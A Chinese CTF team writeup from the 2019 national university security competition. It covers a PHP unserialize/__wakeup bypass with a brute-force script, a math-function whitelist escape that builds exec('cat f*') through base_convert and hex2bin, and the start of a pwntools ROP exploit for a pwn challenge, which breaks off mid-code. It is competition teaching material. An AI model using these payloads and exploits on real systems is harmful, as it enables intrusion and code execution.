<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp | Asuri Team</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Asuri_2019 赛队的 wp 。辛苦各位 Asuri 战队队员了。">
<meta name="keywords" content="writeup">
<meta property="og:type" content="article">
<meta property="og:title" content="2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp">
<meta property="og:url" content="http://asuri.org/2019/04/22/Asuri_2019/index.html">
<meta property="og:site_name" content="Asuri Team">
<meta property="og:description" content="Asuri_2019 赛队的 wp 。辛苦各位 Asuri 战队队员了。">
<meta property="og:locale" content="cn">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2am7bamdvj22800o8495.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2aowgd5kej228016u4qq.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2aoxcl198j21pu096q4j.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap2m9nm4j22800xo0xu.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap50iza8j20b005m3yi.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5am3uuj20a3062aa1.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5helmoj208d0b3aa8.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5oqogij20ea055jrc.jpg">
<meta property="og:image" content="https://i.loli.net/2019/04/21/5cbbfe4598cd4.png">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g29y0gp6a7j20hg07zgss.jpg">
<meta property="og:updated_time" content="2020-11-16T16:08:33.870Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp">
<meta name="twitter:description" content="Asuri_2019 赛队的 wp 。辛苦各位 Asuri 战队队员了。">
<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1g2am7bamdvj22800o8495.jpg">
  
    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Asuri Team</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">Asuri Secure yoUR Information.</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Asuri_2019" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/04/22/Asuri_2019/" class="article-date">
  <time datetime="2019-04-22T14:20:00.000Z" itemprop="datePublished">2019-04-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp
    </h1>
  



      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Asuri_2019 赛队的 wp 。辛苦各位 Asuri 战队队员了。</p>
<a id="more"></a>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h2><p>Index.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;?php</div><div class="line">error_reporting(0); </div><div class="line">$file = $_GET[&quot;file&quot;]; </div><div class="line">$payload = $_GET[&quot;payload&quot;];</div><div class="line">if(!isset($file))&#123;</div><div class="line">	echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;</div><div class="line">&#125;</div><div class="line">if(preg_match(&quot;/flag/&quot;,$file))&#123;</div><div class="line">	die(&apos;hack attacked!!!&apos;);</div><div class="line">&#125;</div><div class="line">@include($file);</div><div class="line">if(isset($payload))&#123;  </div><div class="line">    $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);</div><div class="line">    parse_str($url[&apos;query&apos;],$query);</div><div class="line">    foreach($query as $value)&#123;</div><div class="line">        if (preg_match(&quot;/flag/&quot;,$value)) &#123; </div><div class="line">    	    die(&apos;stop hacking!&apos;);</div><div class="line">    	    exit();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    $payload = unserialize($payload);</div><div class="line">&#125;else&#123; </div><div class="line">   echo &quot;Missing parameters&quot;; </div><div class="line">&#125; </div><div class="line">?&gt;</div><div class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</div><div class="line">&lt;!--Please get the source of hint.php--&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>Hint.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </div><div class="line">    <span class="keyword">private</span> $handle;  </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</div><div class="line">    &#125;</div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </div><div class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </div><div class="line">    &#125; </div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> $token;</div><div class="line">    <span class="keyword">public</span> $token_flag;</div><div class="line"> </div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;file = $file;</div><div class="line">		<span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</div><div class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </div><div class="line">            &#125;  </div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>从<a href="https://paper.seebug.org/39/" target="_blank" rel="external">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a>了解到可以把以下 payload </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:6:&quot;Handle&quot;:1:</div></pre></td></tr></table></figure>
<p>中的 1 改成比 1 大的数可以在反序列化时绕过<code>__warkeup</code>魔术方法<br>绕过<code>$this-&gt;token === $this-&gt;token_flag</code>的判断可以直接通过爆破来绕过</p>
<p>贴一下脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line">url =<span class="string">"http://e281a336df8b4ea1b7665704aca7b30246d3cd0663434603.changame.ichunqiu.com///?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A3%3A&#123;s%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A&#123;s%3A4%3A%22file%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff%22%3Bs%3A10%3A%22token_flag%22%3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff%22%3B&#125;&#125;"</span></div><div class="line"></div><div class="line">proxies =&#123;</div><div class="line">    <span class="string">'http'</span>:<span class="string">'http://127.0.0.1:8080/'</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000000</span>):</div><div class="line">    </div><div class="line">    rep = requests.get(url)</div><div class="line">    <span class="keyword">if</span> rep.status_code == <span class="number">200</span>:</div><div class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> rep.text:</div><div class="line">            print(rep.text)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(rep.status_code)</div><div class="line">    i = i + <span class="number">1</span></div><div class="line">    time.sleep(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="comment"># rep = requests.get(url)</span></div><div class="line"><span class="comment"># print(rep.status_code)</span></div></pre></td></tr></table></figure>
<h2 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="comment">//例子 c=20-1</span></div><div class="line">    $content = $_GET[<span class="string">'c'</span>];</div><div class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</div><div class="line">    &#125;</div><div class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</div><div class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></div><div class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</div><div class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);</div><div class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</div><div class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//帮你算出答案</span></div><div class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>一上午都在懵逼，要么找到可以突破的数学函数，要么突破正则，应该就是这两种思路了。数学函数都看了一遍，貌似没有什么可以利用的函数。正则匹配<code>/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/</code>，这个是 <a href="https://www.php.net/manual/zh/language.variables.basics.php" target="_blank" rel="external">php 变量文档</a>中匹配有效变量名的正则。感觉两个思路都不对…最有可能的还是突破数学函数…数组可以绕之前的，但是<code>eval</code>不能执行</p>
<p>看了好几遍直到看到了<code>base_convert</code>可以在进制转换上做文章，而且根据<a href="https://www.php.net/manual/zh/function.base-convert.php" target="_blank" rel="external">php文档–base_convert</a>，我们可以知道</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</div></pre></td></tr></table></figure>
<p>也就是第二位，第三位参数可以在 2 到 36 之间，而且高于十进制的用字母表示！既然拼接进去的都是字符串，转换出来拼接进去应该可以执行。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2am7bamdvj22800o8495.jpg" alt=""></p>
<p>本地使用<code>base_convert(55490343972,10,36)()</code>成功执行<code>phpinfo</code>，远程也执行了<code>phpinfo</code>看看是不是有什么问题，看了一圈然而并没有发现什么问题。</p>
<p>然后尝试使用各种执行命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">base_convert(<span class="number">15941</span>,<span class="number">10</span>,<span class="number">36</span>);	<span class="comment">//cat</span></div><div class="line">base_convert(<span class="number">1751504350</span>,<span class="number">36</span>,<span class="number">10</span>);	<span class="comment">//system</span></div><div class="line">base_convert(<span class="number">696468</span>,<span class="number">36</span>,<span class="number">10</span>);	<span class="comment">//exec</span></div><div class="line">base_convert(<span class="number">784</span>,<span class="number">36</span>,<span class="number">10</span>);	<span class="comment">//ls</span></div><div class="line">base_convert(<span class="number">21269</span>,<span class="number">36</span>,<span class="number">10</span>);	<span class="comment">//GET</span></div></pre></td></tr></table></figure>
<p>虽然可以执行<code>ls</code>了，看到了<code>flag.php</code>，但是读不到就比较难受了。然后直接就考虑到了是不是可以有<code>cat *</code>这种操作，但是空格跟<code>*</code>都无法编码…这就比较头疼了。而且主要是还得全为数字，有字母的的话就会进<code>whitelist</code>的判断了。</p>
<p>所以可能要尽量避免去使用十六进制什么的含有字母的，考虑到 ascii 码可以转换，又尝试了使用<code>chr</code>函数去转换</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">($pi=base_convert(<span class="number">9453</span>,<span class="number">12</span>,<span class="number">36</span>)).$pi(<span class="number">101</span>).$pi(<span class="number">120</span>).$pi(<span class="number">101</span>).$pi(<span class="number">99</span>)($pi(<span class="number">99</span>).$pi(<span class="number">97</span>).$pi(<span class="number">116</span>).$pi(<span class="number">32</span>).$pi(<span class="number">42</span>))</div><div class="line"></div><div class="line">($pi=base_convert(<span class="number">9453</span>,<span class="number">12</span>,<span class="number">36</span>)).$pi(<span class="number">101</span>).$pi(<span class="number">120</span>).$pi(<span class="number">101</span>).$pi(<span class="number">99</span>)($pi(<span class="number">108</span>).$pi(<span class="number">115</span>))</div><div class="line"></div><div class="line">$pi(<span class="number">96</span>).$pi(<span class="number">108</span>).$pi(<span class="number">115</span>).$pi(<span class="number">96</span>)</div></pre></td></tr></table></figure>
<p>一般的构造结果肯定不行…所以这里想用`ls`这种形式去执行命令，但是由于拼接的原因，一直不能执行…思路卡了很久。</p>
<p>看了一些相关十六进制处理的函数，直到看到了两个函数，一个<code>hex2bin</code>函数，是可以把 16 进制转换成字符串，一个<code>dechex</code>函数，把十进制转换成十六进制。</p>
<p>于是我们可以有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">php &gt; echo base_convert(&apos;636174202a&apos;,16,10);</div><div class="line">426836762666</div><div class="line">php &gt; echo hex2bin(dechex(426836762666));</div><div class="line">cat *</div></pre></td></tr></table></figure>
<p>这样我们就可以把<code>*</code>这个十六进制为<code>2a</code>的转成十进制纯数字的了。</p>
<p>但是我们要怎么利用<code>hex2bin</code>呢，想到可以利用<code>base_convert</code>赋值变量的方式，找到最短的字符串<code>pi</code>，利用<code>$pi=base_convert(37907361743,10,36)</code>构造出<code>hex2bin</code>。</p>
<p>而且还因为<code>echo</code>可以接受如下的拼接方式，例如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">php &gt; <span class="keyword">echo</span> (<span class="number">1</span>).`id`;</div><div class="line"><span class="number">1</span>uid=<span class="number">501</span>(zedd) gid=<span class="number">20</span>(staff) groups=<span class="number">20</span>(staff),<span class="number">12</span>(everyone),<span class="number">61</span>(localaccounts),<span class="number">79</span>(_appserverusr),<span class="number">80</span>(admin),<span class="number">81</span>(_appserveradm),<span class="number">98</span>(_lpadmin),<span class="number">501</span>(access_bpf),<span class="number">701</span>(com.apple.sharepoint.group<span class="number">.1</span>),<span class="number">33</span>(_appstore),<span class="number">100</span>(_lpoperator),<span class="number">204</span>(_developer),<span class="number">250</span>(_analyticsusers),<span class="number">395</span>(com.apple.access_ftp),<span class="number">398</span>(com.apple.access_screensharing),<span class="number">399</span>(com.apple.access_ssh)</div><div class="line">php &gt; <span class="keyword">echo</span> <span class="number">1</span>,`id`;</div><div class="line"><span class="number">1</span>uid=<span class="number">501</span>(zedd) gid=<span class="number">20</span>(staff) groups=<span class="number">20</span>(staff),<span class="number">12</span>(everyone),<span class="number">61</span>(localaccounts),<span class="number">79</span>(_appserverusr),<span class="number">80</span>(admin),<span class="number">81</span>(_appserveradm),<span class="number">98</span>(_lpadmin),<span class="number">501</span>(access_bpf),<span class="number">701</span>(com.apple.sharepoint.group<span class="number">.1</span>),<span class="number">33</span>(_appstore),<span class="number">100</span>(_lpoperator),<span class="number">204</span>(_developer),<span class="number">250</span>(_analyticsusers),<span class="number">395</span>(com.apple.access_ftp),<span class="number">398</span>(com.apple.access_screensharing),<span class="number">399</span>(com.apple.access_ssh)</div></pre></td></tr></table></figure>
<p>尽量取最短的，这里肯定我们就用<code>,</code>这个形式。</p>
<p>所以大致思路就差不多出来了利用<code>base_convert</code>构造<code>hex2bin</code>，然后用最短的可以执行命令的<code>exec</code>函数去执行<code>cat *</code>的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$pi=base_convert(37907361743,10,36),$pi(65786563)($pi(dechex(426836762666)))</div></pre></td></tr></table></figure>
<p>然而没成功…不知道哪里错了，感觉没道理…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">($pi=base_convert),$pi(696468,10,36)($pi(37907361743,10,36)(7267726570206167));</div><div class="line"></div><div class="line">($pi=base_convert),$pi(696468,10,36)($pi(37907361743,10,36)(7267726570202466));</div></pre></td></tr></table></figure>
<p>接着队友说可以用<code>rgrep ag</code>去弄，而且本地打通了…但是远程以上没打通…我又修改了尝试去<code>rgrep fl</code>，也没打通，当时是这样的</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2aowgd5kej228016u4qq.jpg" alt=""></p>
<p>写 wp 的时候，突然又发现可以打通了…</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2aoxcl198j21pu096q4j.jpg" alt=""></p>
<p>也是神奇…最后当时还是按照自己的思路去走了，感觉是不是哪里出问题了，确定有<code>flag.php</code>，最后尝试修改<code>cat f*</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">php &gt; echo base_convert(&apos;63617420662a&apos;,16,10);</div><div class="line">109270211257898</div><div class="line">php &gt; echo hex2bin(dechex(109270211257898));</div><div class="line">cat f*</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$pi=base_convert(37907361743,10,36),$pi(65786563)($pi(dechex(109270211257898)))</div></pre></td></tr></table></figure>
<p>拿到 flag（复现环境下）</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap2m9nm4j22800xo0xu.jpg" alt=""></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your_pwn"></a>your_pwn</h2><p>可重复利用的单字节读写的漏洞.</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap50iza8j20b005m3yi.jpg" alt=""></p>
<p>先直接读取栈上的返回地址泄露<code>pie</code>基址.<br>然后构造<code>ROP</code>链打印库函数地址泄露<code>libc</code>.直接调用<code>system(binsh);</code>获得<code>flag</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">pop_rdi_ret = <span class="number">0xd03</span></div><div class="line">pop_rsi_r15_ret = <span class="number">0xd01</span></div><div class="line"><span class="comment">#r = process("./pwn")</span></div><div class="line">r = remote(<span class="string">"1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com"</span>,<span class="string">"57856"</span>)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">"name:"</span>)</div><div class="line">r.sendline(<span class="string">"cws"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(p)</span>:</span></div><div class="line">    i = <span class="number">0</span></div><div class="line">    ll = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</div><div class="line">        r.recvuntil(<span class="string">"index\n"</span>)</div><div class="line">        r.sendline(str(i + p))</div><div class="line">        data = r.recvuntil(<span class="string">"value\n"</span>)[:<span class="number">-17</span>]</div><div class="line">        data = int(data[<span class="number">-2</span>:],<span class="number">16</span>)</div><div class="line">        <span class="keyword">if</span>(i &lt; <span class="number">8</span>):</div><div class="line">            ll += data * (<span class="number">0x100</span> ** i)</div><div class="line">        r.sendline(str(data))</div><div class="line">        i += <span class="number">1</span></div><div class="line">        <span class="keyword">if</span>(i % <span class="number">41</span> == <span class="number">0</span>):</div><div class="line">            r.recvuntil(<span class="string">"continue(yes/no)? \n"</span>)</div><div class="line">            r.sendline(<span class="string">"yes"</span>)</div><div class="line">            <span class="keyword">return</span> ll</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(p, x)</span>:</span></div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</div><div class="line">        r.recvuntil(<span class="string">"index\n"</span>)</div><div class="line">        r.sendline(str(i + p))</div><div class="line">        r.recvuntil(<span class="string">"value\n"</span>)</div><div class="line">        data = <span class="number">0</span></div><div class="line">        <span class="keyword">if</span>(i != <span class="number">40</span>):</div><div class="line">            data = (x[i/<span class="number">8</span>] / (<span class="number">0x100</span> ** (i % <span class="number">8</span>))) % <span class="number">0x100</span></div><div class="line">        